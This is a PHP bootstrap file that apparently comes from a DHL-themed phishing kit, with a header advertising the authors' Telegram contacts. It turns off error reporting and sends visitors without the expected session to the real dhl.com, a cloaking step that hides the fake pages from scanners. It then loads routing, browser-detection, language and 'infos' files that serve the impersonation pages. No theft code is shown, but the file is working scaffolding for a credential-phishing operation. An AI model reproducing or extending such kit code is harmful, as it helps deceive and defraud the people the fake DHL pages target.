<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/

    session_start();
    error_reporting(0);

    if( !isset($_SESSION['last_page']) || empty($_SESSION['last_page']) ) {
        header("Location: https://www.dhl.com/");
        exit();
    }

    function getMainPath() {
        $ex_path = explode('/',$_SERVER['PHP_SELF']);
        array_pop($ex_path);
        if( $ex_path[0] == '' )
            array_shift($ex_path);
        $path = implode('/',$ex_path);
        return '/' . $path . '/';
    }

    define('BASEPATH',getMainPath());
    define('MAIN', $_SERVER['DOCUMENT_ROOT'] . getMainPath());
    define('IMGSPATH',BASEPATH . '/media/imgs');
    define('CSSPATH',BASEPATH . '/media/css');
    define('JSPATH',BASEPATH . '/media/js');

    include "../infos.php";
    include MAIN . 'inc/BrowserDetection.php';
    include MAIN . 'inc/functions.php';
    include MAIN . 'inc/Route.php';
    include MAIN . 'inc/lang.php';

?>